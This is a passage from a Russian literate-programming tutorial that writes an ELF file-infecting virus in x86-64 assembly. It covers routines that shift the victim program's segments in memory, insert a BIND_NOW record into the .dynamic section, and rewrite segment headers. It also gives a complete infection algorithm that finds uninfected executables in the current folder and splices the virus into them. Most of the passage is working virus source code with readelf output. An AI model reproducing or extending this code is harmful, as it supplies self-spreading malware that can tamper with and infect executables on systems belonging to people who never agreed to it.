      mov     first_seg_vaddr(%rip), %rbx
      sub     %rbx, %rax

      mov     victim_elf_addr(%rip), %rbx
      test    %rbx, %rbx
      je      _count_dynamic_addr_fail

      add     %rax, %rbx
      mov     %rbx, dynamic_records_addr(%rip)

  _count_dynamic_addr_success:
      xor     %rax, %rax
      jmp     _count_dynamic_addr_exit

  _count_dynamic_addr_fail:
      mov     $-1, %rax

  _count_dynamic_addr_exit:
      pop     %rbx
      ret

#+END_SRC

* Сдвинуть мишень

Теперь можно создать аналог ~memcpy~, которая будет просто переписывать
заданное количество байт из одного указателя в другой.
Указатель-источник она принимает в переменной ~cur_seg_addr~, а
указатель-приемник - это тот же указатель, но уменьшенный на 56 байт.

#+NAME: _my_memcpy_without_bind_now
#+BEGIN_SRC asm
  /// _MY_MEMCPY
  /// Переписывает код с одного адреса
  /// в другой
  _my_memcpy:
      pushq    %rcx
      pushq    %rdx
      pushq    %rdi
      pushq    %rsi

      mov     cur_seg_memsz(%rip), %rcx
      test    %rcx, %rcx
      je      _my_memcpy_fail

      mov     cur_seg_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _my_memcpy_fail

      mov     %rsi, %rdi
      sub     $0x38, %rdi

  _cycle_my_memcpy1:

      movb    (%rsi), %dl
      movb    %dl, (%rdi)

      inc     %rsi
      inc     %rdi

      loop    _cycle_my_memcpy1
      jmp     _my_memcpy_success

  _my_memcpy_success:
      xor     %rax, %rax
      jmp     _my_memcpy_exit

  _my_memcpy_fail:
      mov     $-1, %rax

  _my_memcpy_exit:
      popq    %rsi
      popq    %rdi
      popq    %rdx
      popq    %rcx
      ret

#+END_SRC

Теперь обрисуем алгоритм, по которому мы двигем сегменты:
- если сегмент не типа LOAD, пропускаем его
- это первый LOAD-сегмент?
  - да.
    Первый LOAD-сегмент включает в себя таблицу заголовков сегментов, а
    его начало и начало ELF-a - это одно и то же. Нужо сдвинуть только
    тот код, который находистя после таблицы заголовков
    сегментов. Поэтому:
    - посчитать адре ссегмента с помощью ~_get_segm_addr_and_sz~
    - сложить с ним смещение до кода жертвы из переменной
      ~victim_code_offset~ - так получается адрес кода мишени в памяти
    - двигаем сегмент с этого адреса

     Вот так это выглядит:
     #+NAME: _move_first_segment
     #+BEGIN_SRC asm :noweb yes
           // сдвигаем первый сегмент кода
           // он включает в себя заголовок эльфа и
           // таблицу заголовков сегментов, которые
           // сдвигать не надо - нам надо сдвинуть только
           // код жертвы, который начинается сразу после
           // таблицы заголовков

           _move_first_segment:
           mov     %rdi, cur_seg_hdr_ptr(%rip)
           call    _get_segm_addr_and_sz
           test    %rax, %rax
           jne     _move_segments_fail

           mov     cur_seg_addr(%rip), %rax
           mov     cur_seg_memsz(%rip), %rbx

           mov     victim_code_offset(%rip), %rdx
           sub     %rdx, %rbx  # размер сдвигаемого сегмента
           mov     %rbx, cur_seg_memsz(%rip)
           add     %rdx, %rax
           mov     %rax, cur_seg_addr(%rip)

           call    _my_memcpy
           test    %rax, %rax
           jne     _move_segments_fail

           jmp     _move_segments_next

     #+END_SRC

- нет, это не первый сегмент
  Тогда:
  - считаем адрес сегмента с помощью  ~_get_segm_addr_and_sz~
  - двигаем сегмент

     #+NAME: _move_segment
     #+BEGIN_SRC asm :noweb yes
         _move_segment:
             mov     %rdi, cur_seg_hdr_ptr(%rip)
             call    _get_segm_addr_and_sz
             test    %rax, %rax
             jne     _move_segments_fail

             call    _my_memcpy
             test    %rax, %rax
             jne     _move_segments_fail

     #+END_SRC

И обернем этот алгоритм в цикл:


#+NAME: _move_segments
#+BEGIN_SRC asm :noweb yes
    /// _MOVE_SEGMENTS
    /// Сдвигает жертву в памяти процесса таким
    /// образом, как будто никакого заражения не
    /// было
    _move_segments:
        push    %rcx
        push    %rbx
        push    %rdx
        push    %rdi

        mov     victim_phdr_table_addr(%rip), %rdi
        test    %rdi, %rdi
        je     _move_segments_fail

        mov     victim_phdr_amount(%rip), %rcx
        test    %rcx, %rcx
        je     _move_segments_fail

    _move_segments_cycle:
        // загружаемвый сегмент?
        cmp     $0x1, (%rdi)
        jne     _move_segments_next

        // это первый загружаемый сегмент кода?
        mov     PHDR_P_OFFSET(%rdi), %rax
        test    %rax, %rax
        je      _move_first_segment

      <<_move_segment>>

    _move_segments_next:
        add     $0x38, %rdi
        loop    _move_segments_cycle
        jmp     _move_segments_success

     <<_move_first_segment>>

     _move_segments_success:
        xor     %rax, %rax
        jmp     _move_segments_exit

    _move_segments_fail:
        mov    $-1, %rax

    _move_segments_exit:
        pop    %rdi
        pop    %rdx
        pop    %rbx
        pop    %rcx
        ret

#+END_SRC
* Вызвать сдвиг мишени

Весь процесс по передвижке мишени нужно каким-то образом вызвать,
объединить в одну функцию.

Эта функция назвается ~move_victim~.
Ее задача вызвать:
-  ~_get_move_victim_data~, чтоб вытащить данные мишени из буфера
-  ~_count_begin_elf_addr_in_memory~, чтоб получить базовый адрес
  ELF-а в памяти
- ~_get_phdrs_info~, чтоб получить всюинфу о заголовках сегментов
- ~mprotect_in_loop~, чтоб разрешить перезапись кода мишени
- ~_count_dynamic_addr~ и ~_recount_dynamic_section~, чтоб найти секцию ~dynamic~
   в памяти и отредактировать ее
- ~_move_segments~, чтоб сдвинуть все сегменты

Вот так это реализовано:

#+NAME: _move_victim
#+BEGIN_SRC asm
  /// _MOVE_VICTIM
  /// Сдвигает жертву на ее прежние адреса
  _move_victim:
      call    _get_move_victim_data
      test    %rax, %rax
      jne     _move_victim_fail

      call    _count_begin_elf_addr_in_memory
      test    %rax, %rax
      jne     _move_victim_fail

      call    _get_phdrs_info
      test    %rax, %rax
      jne     _move_victim_fail

      call    _mprotect_in_loop
      test    %rax, %rax
      jne     _move_victim_fail

      call   _count_dynamic_addr
      test    %rax, %rax
      jne     _move

      call    _recount_dynamic_section

  _move:
      call    _move_segments
      test    %rax, %rax
      jne     _move_victim_fail

  _move_victim_success:
      ret

  _move_victim_fail:
      jmp     _exit_virus

#+END_SRC

Остается последний вопрос, как вызвать эту функцию. Она должна вызываться
только в случае, когда вирус исполняется из инфицированного файла и
только после того, как он отработает полностью.

Эта задача совершенно аналогичная тому, как передать управление мишени, и
решается она аналогичным образом. Но если мишени мы передаем управление с
помощью относительного ~jmp~, то ~move_victim~ будет передано управление
с помощью относительного ~call~. И впишем мы эти новые 5 байт кода в блок
передачи управления перед инструкцией ~jmp~.

Сначала посчитаем смещение от следующей инструкции за ~call~ - то функции
~move_victim~.

#+NAME: _count_offset_to_move_victim
#+BEGIN_SRC asm
  /// _COUNT_OFFSET_TO_MOVE_VICTIM
  /// считает смещение до функции move_victim
  /// всегда возвращает true
  _count_offset_to_move_victim:
      push   %rbx

      leaq    _move_victim(%rip), %rbx
      leaq    _global_exit(%rip), %rax
      add     $0x5, %rax  # пропустили будущую команду jmp

      sub     %rax, %rbx
      movl    %ebx, move_victim_offset(%rip)

      xor     %rax, %rax
      pop     %rbx
      ret
#+END_SRC

Вызываться эта функция будет из ~_recount_victim~:

#+NAME: _call_count_offset_to_move_victim
#+BEGIN_SRC asm :noweb yes
        call    _count_offset_to_move_victim
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

А теперь впишем опкод ~call~ и смещение в блок передачи управления перед
инструкицей ~jmp~

#+NAME: _call_move_victim
#+BEGIN_SRC asm :noweb yes
      mov     $0xe8, %rbx
      movzwl  %bx, %ebx

      // call opcode
      movb    %bl, (%rax)
      inc     %rax

      // offset
      mov     move_victim_offset(%rip), %rbx
      test    %rbx, %rbx
      je      _transfer_control_to_victim_fail

      mov     %ebx, (%rax)
      add     $0x4, %rax

#+END_SRC

* Самая большая проблема

К сожалению, даже описанные выше ухищрения не позволяют ELF-у корректно
отработать.

Если помните, в разделе о линкове упоминался буфер, в который не в меру
умный линкер записывает адреса, по которым лежат интересующие его и libc
записи из секции dynamic. Но раз мы подвинули весь код, то секция dynamic
тоже сдвинулась на 56 байт.

В резльутате мы получаем потрясающую ситуацию: не сдвигать код жертвы мы
не можем, потому что у нас позиционно-зависимый код, а сдвиг приводит к
тому, что адреса записей секции ~dynamic~ в буфере становятся
неактуальными и ~libc~ получает доступ к совсем не той информации, на
которую рассчитывает. И отредактировать эти адреса нет никакой возможности: они
не расположены в буфере один за другим, мы не знаем, сколько их и т.д.

Есть небольшой хак, который позволит нам отказаться от ленивого
связывания, а следоватлеьно отказаться от большей части адресов, которые
сохранены в секции dynamic. Линкер умеет связывать все и сразу до того,
как передаст управление программе, надо просто это указать. Делается это
с помощью записи, которая  находится в секции dynamic и называется
BIND_NOW. Она представляет собой 16 байт кода. Где в первые 8 байт вы пишете число
0x18. Вставить эту запись, в теории, можно в любое место секции dynamic,
но я вставляю ее перед записью NULL - это последняя запись в секции, она
обязательна и полностью заполнена нулями, так что ее легко найти.

Вот так выглядит секция dynamic до вставки записи:

#+BEGIN_SRC sh
  $ readelf -d hello

  Dynamic section at offset 0xe28 contains 24 entries:
    Тег        Тип                          Имя/Знач
   0x0000000000000001 (NEEDED)             Совм. исп. библиотека: [libc.so.6]
   0x000000000000000c (INIT)               0x4004a8
   0x000000000000000d (FINI)               0x400714
   0x0000000000000019 (INIT_ARRAY)         0x600e10
   0x000000000000001b (INIT_ARRAYSZ)       8 (байт)
   0x000000000000001a (FINI_ARRAY)         0x600e18
   0x000000000000001c (FINI_ARRAYSZ)       8 (байт)
   0x000000006ffffef5 (GNU_HASH)           0x400298
   0x0000000000000005 (STRTAB)             0x400378
   0x0000000000000006 (SYMTAB)             0x4002b8
   0x000000000000000a (STRSZ)              86 (байт)
   0x000000000000000b (SYMENT)             24 (байт)
   0x0000000000000015 (DEBUG)              0x0
   0x0000000000000003 (PLTGOT)             0x601000
   0x0000000000000002 (PLTRELSZ)           144 (байт)
   0x0000000000000014 (PLTREL)             RELA
   0x0000000000000017 (JMPREL)             0x400418
   0x0000000000000007 (RELA)               0x400400
   0x0000000000000008 (RELASZ)             24 (байт)
   0x0000000000000009 (RELAENT)            24 (байт)
   0x000000006ffffffe (VERNEED)            0x4003e0
   0x000000006fffffff (VERNEEDNUM)         1
   0x000000006ffffff0 (VERSYM)             0x4003ce
   0x0000000000000000 (NULL)               0x0
#+END_SRC

А вот так после:
#+BEGIN_SRC sh
  $ readelf -d hello

  Dynamic section at offset 0xe60 contains 25 entries:
    Тег        Тип                          Имя/Знач
   0x0000000000000001 (NEEDED)             Совм. исп. библиотека: [libc.so.6]
   0x000000000000000c (INIT)               0x4004e0
   0x000000000000000d (FINI)               0x40074c
   0x0000000000000019 (INIT_ARRAY)         0x600e48
   0x000000000000001b (INIT_ARRAYSZ)       8 (байт)
   0x000000000000001a (FINI_ARRAY)         0x600e50
   0x000000000000001c (FINI_ARRAYSZ)       8 (байт)
   0x000000006ffffef5 (GNU_HASH)           0x4002d0
   0x0000000000000005 (STRTAB)             0x4003b0
   0x0000000000000006 (SYMTAB)             0x4002f0
   0x000000000000000a (STRSZ)              86 (байт)
   0x000000000000000b (SYMENT)             24 (байт)
   0x0000000000000015 (DEBUG)              0x0
   0x0000000000000003 (PLTGOT)             0x601048
   0x0000000000000002 (PLTRELSZ)           144 (байт)
   0x0000000000000014 (PLTREL)             RELA
   0x0000000000000017 (JMPREL)             0x400450
   0x0000000000000007 (RELA)               0x400438
   0x0000000000000008 (RELASZ)             24 (байт)
   0x0000000000000009 (RELAENT)            24 (байт)
   0x000000006ffffffe (VERNEED)            0x400418
   0x000000006fffffff (VERNEEDNUM)         1
   0x000000006ffffff0 (VERSYM)             0x400406
   0x0000000000000018 (BIND_NOW)
   0x0000000000000000 (NULL)               0x0
#+END_SRC

Обратите внимание, что все адреса изменились на 56 байт, поскольку
вариант dynamic "после" взят из зараженного файла.

К сожалению, BIND_NOW решает проблему с ленивым связываением, но не
решает проблему с работой libc.

libc должна обеспечить корректный старт и завершение сишной
программе. Она настраивает стек, регистры и т.д. Для этого она использует
код, который компилятор вписал в код вашей программы. Для инициализации
программы используется код из секций init и init_array, а для завершения
программы используется код из fini и fini_array. Доступ к этому коду libc
получает с помощью записей dynamic, которые видны на выводе dynamic
выше. А адреса этих записей libc берет из уже известного нам буфера, куда
их кладет линкер на этапе линковки. И у нас нет возможности повлиять на
этот процесс, кроме самого радикального.

Нам сильно повезло и все эти записи находятся в начале секции dynamic. К
секции напрямую никакой другой код не обращается, а линкер больше
включаться не будет, потому что мы все связали сразу. Следовательно, мы
можем не двигать секцию dynamic - единственную из всего кода мишени - но
при этом сдвинуть весь код, ниже нее, на 72 байта - размер заголловка
вируса + размер записи BIND_NOW - просто затерев несколько записей dynamic.
Таким образом нужные libc записи окажутся на тех адресах, которые лнкер
сохранил в буфер, и libc сможет без проблем получить все, что ей нужно.

Посмотрим, как будет выглядеть файл до и после того, как мы подвинули код
мишени:

#+NAME: infected_elf5
#+BEGIN_SRC ditaa :file ./img/infected_elf5.png
  +-------------------------------------+  +--------------------------------------+
  |0x400000 Заголовок ELF-файла         |  |0x400000 Заголовок ELF-файла          |
  |         (ELF-header)                |  |         (ELF-header )                |
  +-------------------------------------+  +--------------------------------------+

  +-------------------------------------+  +--------------------------------------+
  |0x400040 Таблица заголовков сегментов|  |0x400040  Таблица заголовков сегментов|
  |         (Program Header Table)      |  |          (Program Header Table)      |
  +-------------------------------------+  +--------------------------------------+
  |0x400040 PHDR Header                 |  |0x400040   PHDR Header                |
  |0x400078 Interp Header               |  |0x400078   Interp Header              |
  |0x4000b0 Load Header                 |  |0x4000b0   Load Header                |
  |         (victim load header)        |  |           (victim load header)       |
  |...      ...                         |  |...        ...                        |
  +-------------------------------------+  +--------------------------------------+
  |0x400190 Load Header                 |
  |         (malware load header)       |
  +-------------------------------------+


  +-------------------------------------+  +--------------------------------------+
  |0x400000 Load Segment 1              |  |0x400000   Load Segment 1             |
  |         ...                         |  |           ...                        |
  |0x400468 original e_entry            |  |0x400430   original e_entry           |
  +-------------------------------------+  +--------------------------------------+
  |0x600e48 Load Segment 2              |  |0x600e10   Load Segment 2             |
  +-------------------------------------+  +--------------------------------------+
  | ...     ...                         |  | ...       ...                        |
  +-------------------------------------+  +--------------------------------------+

  +-------------------------------------+  +--------------------------------------+
  |0x600e60 Dynamic Section             |  |0x600e28   Dynamic Section            |
  |                                     |  |                                      |
  +-------------------------------------+  +--------------------------------------+
  |0x600e70 INIT                        |  |0x600e38   INIT                       |
  +-------------------------------------+  +--------------------------------------+
  |0x600e60 FINI                        |  |0x600e48   FINI                       |
  +-------------------------------------+  +--------------------------------------+
  |...      ...                         |  |...        ...                        |
  +-------------------------------------+
  |0x600fd0 BIND_NOW                    |
  +-------------------------------------+
  |0x600fd0 NULL                        |
  +-------------------------------------+


  +-------------------------------------+  +--------------------------------------+
  |0x80128a Load Segment                |  |0x801242   Load Segment               |
  |         (malware load segment)      |  |           (malware load segment)     |
  +-------------------------------------+  +--------------------------------------+
  |0x80158a Transfer Control to         |  |0x801542   Transfer Control to        |
  |         original e_entry            |  |           original e_entry           |
  +-------------------------------------+  +--------------------------------------+
#+END_SRC

#+results: infected_elf5
[[file:./img/infected_elf5.png]]

Обратите внимание, что весь код после секции dynamic перемещается не на
56 байт, а на 72 байта.

* Реализация вставки BIND_NOW

** Полный алгоритм заражения с BIND_NOW
Заражение:

- найти незараженный ELF в текущей папке

- распарсить жертву:
  - получить информацию о заголовках сегментов: адрес, количество,
    сколько памяти занимают
  - получить информацию о заголовках секций: адрес, количество,
    сколько памяти занимают
  - найти первый LOAD-сегмент
  - найти последний LOAD-сегмент
  - найти секцию ~.dynamic~
    - секция найдена:
      - в секции dynamic есть запись BIND_NOW?
         - нет:
           - посчитать смещение от начала секции до места вставки новой записи
             (обычно это смещение записи NULL)
           - поместить число 0х10 в переменную
             ~new_bind_now_flag_record_size~ - это флаг, что нужно вставить
             BIND_NOW и одновременно константа, на которую увеличиваются все
             адреса/смещения, если они описывают код, который находится ниже
             секции ~.dynamic~
         - да:
           - обнулить переменную ~new_bind_now_flag_record_size~
      - найти секцию got
      - посчитать ее адрес в памяти
  - запсиь BIND_NOW вставляется?
    - нет:
      - высчитать адрес и размер кода жертвы - начинается после заголовков
        сегментов и заканчивается перед заголовками секций. Будем
        записывать в файл одним вызовом
    - да:
      - высчитать адрес и размер кода жертвы от конца таблицы заголовков
        сегментов и до места вставки BIND_NOW
      - высчитать адрес и размер кода от места вставки BIND_NOW до
        заголовков секций
        Перезаписывать код мишени придется в два вызова, чтоб вставить
        между ними новую запись
  - найти .symtab
  - найти первую секцию типа PROGBITS - от нее требуется индекс
    используемой строки в таблице строк. Восользуемся ею как именем
    секции вируса
  - посчитать виртуальный адрес начала кода мишени - базовый адрес
    эльфа + размер таблицы заголовков сегментов + размер заголовка эльфа

- получить данные вируса:
  - получить адрес его начала - метка start
  - получить его размер

- пересчитать мишень:
  - пересчитать адреса символов в записях ~.symtab~: если адрес символа >
    адреса dynamic, увеличить адрес символа на 56 байт + содержимое
    ~new_bind_now_flag_record_size~ иначе просто увеличить на 56 байт
  - найти и пересчитать секции rela: их несколько, поэтому проще находить
    их и тут же считать, а не разбивать это на два этапа. Пересчет по
    тому же принципу, что и адреса в ~.symtab~
  - пересчитать адреса и смещение заголовков секций + расширить секцию
    ~.dynamic~ на содержимое ~new_bind_now_flag_record_size~
  - пересчитать адреса и смещения заголовков сегментов + расширить сегмент
    ~.dynamic~ на содержимое ~new_bind_now_flag_record_size~
  - пересчитать адреса в записях ~.dynamic~ (если секция есть)
  - пересчитать адреса в записях ~.got~ (если секция есть)

  - сгенерировать недостающие данные для заражения:
    - посчитатать виртуальный адрес вируса
    - создать заголовок сегмента для него
    - создать зголовок секции для него
    - создать запись BIND_NOW (если требуется)

  - отредактировать заголовок эльфа: изменть точку входа, смещение до
    заголовков секций, увеличить кол-во заголовков сегментов и секций

  - посчитать смещения:
    - посчитать смещение от начала файла до оригинальной точки входа
    - посчитать смещение от оригинальной точки входа до новой точки входа
    - посчитать смещение от последней инструкции nop до оригинальной
      точки входа (это смещени нужно для относительного ~jmp~, чтоб
      передать жертве управление)
    - посчитать смещение от относительного ~jmp~ (он передает управление
      на жертву) до функции ~move_victim~:  это смещение нужно для
      относительного ~call~, чтоб вызвать сдвиг жертвы

  - сгенерировать блоки:
    - блок передачи управления: в него входит вызов ~move_victim~ и
      передача управления
    - блок данных мишени - нужны для ~move_victim~

- записть эльф на диск:
  - вписать от начала файла до конца таблицы заголовков сегментов
  - вписать новый заголовок сегмента вируса
  - BIND_NOW вставляется?
    - да:
      - вписать код жертвы от таблицы сегментов до записи NULL в
        ~.dynamic~
      - вписать запись BIND_NOW
      - вписать код жертвы от записи NULL в ~.dynamic~ до таблицы
        заголовков секций
    - нет:
      - вписать весь код мишени от конца таблицы сегментов до таблицы
        секций целиком
   - вписать код вируса
   - вписать блок передачи управления
   - вписать блок данных мишени
   - записать таблицу заголовков секций мишени
   - записать заголовок секции вируса

Исполнение:
  - исполняется вирус, доходит до блока передачи управления
  - вызывается move_victim (сдвинуть жертву)
  - сдвиг жертвы:
    - получить данные мишени из блока данных
    - посчитть базовый адрес ELF-a в памяти
    - полчить инфу о заголовках сегментов: адрес, количество, сколько
      места занимают
    - разрешить перезапись каждому загружаемому сегменту:
      - посчитать адрес в памяти каждого сегмента
      - вызвать для него mprotect с правами на запись/чтение/исполнение
    - посчитать адрес секции ~.dynamic~ в памяти
    - отредактировать секцию ~.dynamic~, вернув всем виртуальным адресам
      в ее записях исходные адреса

     - перезапись:
       - для каждого сегмента вызвать memcpy: адрес-источник - это адрес
         начала сегмента в памяти, адрес-приемник - тот же адрес, но на
         56 байт меньше
       - если во время компирования кода сегмента наткнулись на секцию
         ~dynamic~, то:
         - пропустить секцию, сдвинув указатели: указатель источник
           увеличивается на размер секции ~.dynamic~, указатель-приемник
           увеличивается на то же значение, но из полученного указателя
           вычитается содержимое ~new_bind_now_flag_record_size~: так
           затрется запись BIND_NOW, если она была вставлена

  - передать управление на код мишени
  - done


Теперь нужно реализовать то, что описано в разделе выше.
Вставка 16 байт кода куда сложнее, чем может опказаться на первый
взгляд хотя бы потому, что нарушает идею, что весь код жертвы должен
сдвинуться равномерно.

На каждом этапе работы вируса придется учитывать два кейса:
- вставка BIND_NOW не требуется: мишень собрана без библиотек или же
  запись BIND_NOW уже есть в секции dynamic
- запись BIND_NOW необходима

Чтоб это выяснить, нужно определить, есть ли запись BIND_NOW в секции
~dynamic~.

** Найти BIND_NOW

Чтоб найти эту запись в секции ~dynamic~, достаточно знать ее тип - это
тип 0x18. Мы проходимся циклом по секции и если доходим до записи NULL -
она последняя в секции - то считаем, что запись ~BIND_NOW~ не найдена.

Тогда мы:

- заносим в переменную ~new_bind_now_flag_record_size~ размер вставляемой
  записи - 0x10
- считаем смещение от начала секции до места, куда вставляем запись: для
  этого надо сохранить адрес первой записи ~dynamic~ нетронутым и вычесть
  его из адреса, на котором находится запись NULL

В случае, если запись BIND_NOW не найдена, то в
~new_bind_now_record_size~ заносится ноль.

#+NAME: _find_bind_now_record
#+BEGIN_SRC asm
  _find_bind_now_record:
      push    %rdx
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      mov    dynamic_records_offset(%rip), %rdx
      test   %rdx, %rdx
      je      _find_bind_now_record_fail

      mov     dynamic_records_size(%rip),%rax
      test    %rax, %rax
      je      _find_bind_now_record_fail

      // адрес секции dynamic в памяти
      mov    victim_elf_addr(%rip), %rdi
      add    %rdx, %rdi

      mov     %rdi, %r8

      // установили счетчик цикла
      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx
      mov     %eax, %ecx

  _find_bind_now_record_cycle:
      // запсиь BIND_NOW?
      cmpq    $0x18, (%rdi)
      je      _bind_now_record_exist

      // запись NULL?
      cmp     $0x0, (%rdi)
      // запись NULL всегда последняя,
      // так что дальше проверять не имеет смысла
      je      _no_bind_now_record_exist

      add     $0x10, %rdi
      loop    _find_bind_now_record_cycle

      jmp     _no_bind_now_record_exist

  _bind_now_record_exist:
      //  обнуили размер новой записи - ее же не будет
      movb    $0x0, new_bind_now_flag_record_size(%rip)
      xor     %rax, %rax

      jmp     _find_bind_now_record_exit

      // записи BIND_NOW нет - придется позже генерировать новую
  _no_bind_now_record_exist:
      movb    $0x10, new_bind_now_flag_record_size(%rip)

      // посчитали смещение от начала секции dynamic
      // до места, куда будем вписывать новую запись
      sub     %r8, %rdi
      mov     %rdi, new_bind_now_record_frm_dynamic_offset(%rip)

      xor     %rax, %rax
      jmp     _find_bind_now_record_exit

  _find_bind_now_record_fail:
      mov     $-1, %rax

  _find_bind_now_record_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      pop     %rdx
      ret

#+END_SRC

Поиск записи BIND_NOW вполне можно счесть частью парсинга мишени. Поэтому
вызовем этот поиск из ~parse_victim~:

#+NAME: _call_find_bind_now_record
#+BEGIN_SRC asm :noweb yes
      call    _find_bind_now_record
      test    %rax, %rax
      jne     _parse_victim_fail
#+END_SRC

[[_parse_victim][_parse_victim]]

** Что такое new_bind_now_flag_record_size

Имя этой переменной уже фигурировало у нас, когда создавался блок данных
мишени. Тогда было сказано, что эта переменная является своего рода
флагом.

Отчасти это так, но все немного хитрее.

Если запись BIND_NOW вставляется, то секция ~dynamic~ расширится на 16
байт. Это значит, что весь код, который находится поcле нее, должен
съехать в файле и в памяти на ополнительные 16 байт при инфицировании
"вниз", а при сдвиге - подвинуться на дополнительные 16 байт "наверх".

Проверять на каждом этапе вставляется ли секция новая запись или нет -
это слишком энергозатратно. Поэтому вводится переменная
~new_bind_now_flag_record_size~.

Эта переменная содержит в себе ~размер~ записи BIND_NOW. По умолчанию
переменная равна нулю. Но если вставка BIND_NOW необходима, то в
переменную заносится число 0x10. Что это дает?

Дело в том, что при редактировании любых записей любых секций, любых
заголовков и т.д. мы можем поставить одно условие: если мы редактируем
адрес или смещение, код по которым располагается ~ниже~ секции ~dynamic~
в памяти и в файле, то мы увеличиваем редактируемое значение на 56 байт +
значение переменной ~new_bind_now_flag_record_size~. Если вставка
BIND_NOW не требуется, то в  ~new_bind_now_flag_record_size~ окажется
ноль: тогда редактируемое значение увеличится на 56 байт. Но если запись
требуется, то значение увеличится на 72 байта.

Поэтому эта переменная с одной стороны является флагом, а с другой -
константой, на которую увеличиваются все адреса и смещения, если
~dynamic~ расширяется.

** Новое редактирование заголовков сегментов

Теперь, когда у нас запись BIND_NOW, то каждая функция, которая
редактирует код мишени должна учитывать, что секция ~dynamic~ может
расширяться.

Начнем с редактирования заголовков сегментов - функции
~_phdr_offset_and_addr_recount~.

Для начала положим значение переменной в регистр ~rbx~.

#+NAME: _put_bind_now_flag_value1
#+BEGIN_SRC asm :noweb yes

mov     new_bind_now_flag_record_size(%rip), %rbx

#+END_SRC

Если секция ~dynamic~ может расширяться, то нужно отредактировать
заголовок ее сегмента.
Добавим этот небольшой кусочек кода в функцию. Он проверяет, является ли
данный заголовок - заголовком сегмента ~dynamic~, и если да, то
увеличивает его размер в памяти в файле на содержимое прееменной
~new_bind_now_flag_record_size~.

#+NAME: _edit_dynamic_header
#+BEGIN_SRC asm :noweb yes
      // это заголовок сегмента dynamic?
      cmp     $0x2,  %rax
      jne     _phdr_offset_and_addr_check

      _edit_dynamic_header:

      add     %rbx, PHDR_P_FILESZ(%rdi)
      add     %rbx, PHDR_P_MEMSZ(%rdi)

      jmp     _phdr_offset_and_addr_check

#+END_SRC

Теперь нужно добавить проверку, находится ли редактируемый сегмент после
секции ~dynamic~. Если его адрес или смещение больше адреса или смещения
секции ~dynamic~, то считаем, сегмент расположен после секции и тогда
прибавляем содержимое переменной ~new_bind_now_flag_record_size~ к
значению.

Добавим этот функционал для редактирования виртуального и физического
адресов сегмента.

#+NAME: _addr_after_dynamic
#+BEGIN_SRC asm :noweb yes
  _recount_vaddr_paddr:
      mov     dynamic_records_vaddr(%rip), %r8

      cmp     %r8, PHDR_P_VADDR(%rdi)
      jle     _add_const_to_vaddr_paddr

      add     %rbx, PHDR_P_VADDR(%rdi)
      add     %rbx, PHDR_P_PADDR(%rdi)

#+END_SRC

И такую же проверку введем для смещения.

#+NAME: _offset_after_dynamic
#+BEGIN_SRC asm :noweb yes
      mov     dynamic_records_offset(%rip), %r8

      cmp     %r8, PHDR_P_OFFSET(%rdi)
      jle     _add_const_to_phdr_offset

      add     %rbx, PHDR_P_OFFSET(%rdi)

#+END_SRC

Теперь вставим эти куски кода в функцию  ~_phdr_offset_and_addr_recount~.

#+NAME: _phdr_offset_and_addr_recount
#+BEGIN_SRC asm  :noweb yes
  /// _PHDR_OFFSET_AND_ADDR_RECOUNT
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
  _phdr_offset_and_addr_recount:
      push    %rbx
      push    %rdx
      push    %rcx
      push    %r8
      push    %rdi
      push    %rsi

      // проверяем данные,
      // необходимые для редактирования
      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _phdr_offset_and_addr_recount_fail

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _phdr_offset_and_addr_recount_fail

      mov     first_seg_vaddr(%rip), %rsi

      <<_put_bind_now_flag_value1>>
      mov     $0x38, %rdx

  _phdr_offset_and_addr_recount_cycle:
      movl    (%rdi), %eax

      // это заголовок самой таблицы заголовков?
      cmp     $0x6,  %rax
      je      _edit_phdr_table_header

   <<_edit_dynamic_header>>

  _edit_phdr_table_header:
      // редактируем поля p_filesz
      // и p_memsz в заголовке таблицы сегментов
      // заголовков станет на один больше, значит,
      //  размер таблицы надо увеличить на 56 байт
      add     %rdx, PHDR_P_FILESZ(%rdi)
      add     %rbx, PHDR_P_MEMSZ(%rdi)

      jmp     _next_iter_recount_phdr

  _phdr_offset_and_addr_check:
      cmp     %rsi, PHDR_P_PADDR(%rdi)
      je      _edit_first_segm_header

      cmp     $0,  PHDR_P_PADDR(%rdi)
      jle     _recount_offset
      jmp     _recount_vaddr_paddr

  _edit_first_segm_header:
      // это первый сегмент кода -
      // содерит в себе заголовки
      // увеличить его p_memsz и p_filesz
      // на размер добавляемого заголвока
      // а вот его vaddr,paddr и offset
      // не редактируем - новый заголвок
      // будет вписан В него, а не ДО
      // него
      add     %rdx, PHDR_P_FILESZ(%rdi)
      add     %rdx, PHDR_P_MEMSZ(%rdi)

      jmp     _next_iter_recount_phdr

      <<_addr_after_dynamic>>

  _add_const_to_vaddr_paddr:
      add     %rdx, PHDR_P_VADDR(%rdi)
      add     %rdx, PHDR_P_PADDR(%rdi)

  _recount_offset:
      cmp     $0, PHDR_P_OFFSET(%rdi)
      jle     _next_iter_recount_phdr

      <<_offset_after_dynamic>>
  _add_const_to_phdr_offset:
      add     %rdx, PHDR_P_OFFSET(%rdi)

      jmp     _next_iter_recount_phdr

  _next_iter_recount_phdr:
      add     $0x38, %rdi

      dec     %rcx
      test    %rcx, %rcx
      jne     _phdr_offset_and_addr_recount_cycle

  _phdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _phdr_offset_and_addr_recount_exit

  _phdr_offset_and_addr_recount_fail:
      mov     $-1, %rax

  _phdr_offset_and_addr_recount_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rcx
      pop     %rdx
      pop     %rbx
      ret

#+END_SRC

** Новое редактирование заголвоков секций

Теперь нужно добавить похожий функционал для фнукици
~_shdr_offset_and_addr_recount~, которая редактирует смещения и адреса в
заголовках секций.

Аналогино положим содержимое ~new_bind_now_flag_record_size~ в ~rbx~.

#+NAME: _put_bind_now_flag_value1
#+BEGIN_SRC asm :noweb yes

mov     new_bind_now_flag_record_size(%rip), %rbx

#+END_SRC

